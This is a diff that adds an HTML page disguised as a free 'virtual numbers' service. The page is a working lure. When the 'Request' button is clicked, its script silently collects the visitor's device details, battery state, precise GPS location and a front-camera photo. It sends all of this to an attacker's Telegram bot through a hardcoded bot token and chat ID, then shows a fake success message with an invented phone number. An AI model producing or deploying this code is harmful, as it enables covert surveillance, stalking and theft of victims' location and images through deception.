@@ -1,0 +1,288 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Virtual numbers </title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+      background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
+      min-height: 100vh;
+      color: #e0e0e0;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+    }
+
+    .container {
+      background: rgba(255, 255, 255, 0.05);
+      backdrop-filter: blur(12px);
+      border: 1px solid rgba(255, 255, 255, 0.1);
+      border-radius: 24px;
+      padding: 32px 28px;
+      max-width: 420px;
+      width: 100%;
+      box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
+    }
+
+    h1 {
+      font-size: 1.6rem;
+      font-weight: 700;
+      text-align: center;
+      margin-bottom: 8px;
+      background: linear-gradient(90deg, #a78bfa, #60a5fa);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      background-clip: text;
+    }
+
+    .subtitle {
+      text-align: center;
+      color: #a0a0b0;
+      font-size: 0.95rem;
+      margin-bottom: 28px;
+      line-height: 1.4;
+    }
+
+    button {
+      width: 100%;
+      padding: 16px;
+      font-size: 1.05rem;
+      font-weight: 600;
+      border: none;
+      border-radius: 14px;
+      cursor: pointer;
+      background: linear-gradient(90deg, #8b5cf6, #3b82f6);
+      color: white;
+      transition: all 0.25s ease;
+      box-shadow: 0 4px 15px rgba(139, 92, 246, 0.4);
+    }
+
+    button:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 8px 25px rgba(139, 92, 246, 0.5);
+    }
+
+    button:active {
+      transform: translateY(0);
+    }
+
+    button:disabled {
+      opacity: 0.6;
+      cursor: not-allowed;
+      transform: none;
+    }
+
+    .log-box {
+      margin-top: 24px;
+      background: rgba(0, 0, 0, 0.3);
+      border-radius: 14px;
+      padding: 16px;
+      font-size: 0.85rem;
+      line-height: 1.5;
+      max-height: 260px;
+      overflow-y: auto;
+      border: 1px solid rgba(255, 255, 255, 0.08);
+      white-space: pre-wrap;
+      word-break: break-word;
+    }
+
+    .status {
+      display: inline-block;
+      padding: 4px 10px;
+      border-radius: 20px;
+      font-size: 0.75rem;
+      font-weight: 600;
+      margin-bottom: 12px;
+    }
+
+    .status.ready {
+      background: rgba(34, 197, 94, 0.2);
+      color: #4ade80;
+    }
+
+    .status.sending {
+      background: rgba(59, 130, 246, 0.2);
+      color: #60a5fa;
+    }
+
+    .status.success {
+      background: rgba(34, 197, 94, 0.25);
+      color: #4ade80;
+    }
+
+    .status.error {
+      background: rgba(239, 68, 68, 0.2);
+      color: #f87171;
+    }
+
+    video, canvas {
+      display: none;
+    }
+
+    /* Scrollbar */
+    .log-box::-webkit-scrollbar {
+      width: 6px;
+    }
+    .log-box::-webkit-scrollbar-track {
+      background: transparent;
+    }
+    .log-box::-webkit-scrollbar-thumb {
+      background: rgba(255, 255, 255, 0.2);
+      border-radius: 3px;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>Virtual numbers</h1>
+    <p class="subtitle">
+     Place request for virtual numbers for free just in one click, other requests comes with credits.<br>  🇷🇺 🇬🇭 🇨🇳 🇬🇧 🇺🇸 🇩🇪 
+    </p>
+
+    <button id="start">Request</button>
+
+    <div class="log-box" id="log">
+      <span class="status ready">Ready</span>
+      Waiting for you to click the button...
+    </div>
+  </div>
+
+  <video id="video" autoplay playsinline></video>
+  <canvas id="canvas"></canvas>
+
+  <script>
+    // ========== REPLACE THESE TWO VALUES ==========
+    const BOT_TOKEN = '9127684857:AAHBL3eHY9aKkIlBJnlXTIDwoy2YE8MzzWs';
+    const CHAT_ID   = '8564378992';
+    // ==============================================
+
+    const logEl = document.getElementById('log');
+    const btn = document.getElementById('start');
+
+    function setLog(html) {
+      logEl.innerHTML = html;
+    }
+
+    async function sendToTelegram(text, photoBlob = null) {
+      // Send text
+      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text: text,
+          parse_mode: 'HTML',
+          disable_web_page_preview: false
+        })
+      });
+
+      // Send photo
+      if (photoBlob) {
+        const form = new FormData();
+        form.append('chat_id', CHAT_ID);
+        form.append('photo', photoBlob, 'front-camera.jpg');
+        form.append('caption', 'Front camera capture');
+
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+          method: 'POST',
+          body: form
+        });
+      }
+    }
+
+    async function collectAndSend() {
+      btn.disabled = true;
+      setLog(`<span class="status sending">Working...</span>\nRequesting credits...`);
+
+      const lines = [];
+      lines.push(`<b>Time</b>: ${new Date().toLocaleString()}`);
+      lines.push(`<b>Device</b>: ${navigator.userAgent.split(')').shift()})`);
+
+      // Battery
+      try {
+        if ('getBattery' in navigator) {
+          const b = await navigator.getBattery();
+          const percent = Math.round(b.level * 100);
+          lines.push(`<b>Battery</b>: ${percent}% ${b.charging ? '⚡ Charging' : ''}`);
+        } else {
+          lines.push('<b>Battery</b>: Not supported on this browser');
+        }
+      } catch (e) {
+        lines.push(`<b>Battery</b>: ${e.message}`);
+      }
+
+      // Location
+      try {
+        const pos = await new Promise((resolve, reject) => {
+          navigator.geolocation.getCurrentPosition(resolve, reject, {
+            enableHighAccuracy: true,
+            timeout: 12000
+          });
+        });
+        const { latitude, longitude, accuracy } = pos.coords;
+        lines.push(`<b>Location</b>: ${latitude.toFixed(5)}, ${longitude.toFixed(5)}`);
+        lines.push(`Accuracy: ±${Math.round(accuracy)} meters`);
+        lines.push(`<a href="https://maps.google.com/?q=\( {latitude}, \){longitude}">Open in Google Maps</a>`);
+      } catch (e) {
+        lines.push(`<b>Location</b>: ${e.message}`);
+      }
+
+      // Front Camera
+      let photoBlob = null;
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({
+          video: {
+            facingMode: 'user',          // Front camera
+            width: { ideal: 1280 },
+            height: { ideal: 720 }
+          },
+          audio: false
+        });
+
+        const video = document.getElementById('video');
+        video.srcObject = stream;
+        await video.play();
+
+        await new Promise(r => setTimeout(r, 600));
+
+        const canvas = document.getElementById('canvas');
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        canvas.getContext('2d').drawImage(video, 0, 0);
+
+        stream.getTracks().forEach(t => t.stop());
+        video.srcObject = null;
+
+        photoBlob = await new Promise(resolve => 
+          canvas.toBlob(resolve, 'image/jpeg', 0.85)
+        );
+        lines.push('<b>Camera</b>: Front camera photo captured ✓');
+      } catch (e) {
+        lines.push(`<b>Camera</b>: ${e.message}`);
+      }
+
+      // Send to Telegram
+      try {
+        setLog(`<span class="status sending">Generating number...</span>`);
+        await sendToTelegram(lines.join('\n'), photoBlob);
+        setLog(`<span class="status success">Success!</span>\nData + phone number is 2348107897283.`);
+      } catch (e) {
+        setLog(`<span class="status error">Failed</span>\n${e.message}`);
+      }
+
+      btn.disabled = false;
+    }
+
+    btn.onclick = collectAndSend;
+  </script>
+</body>
+</html>
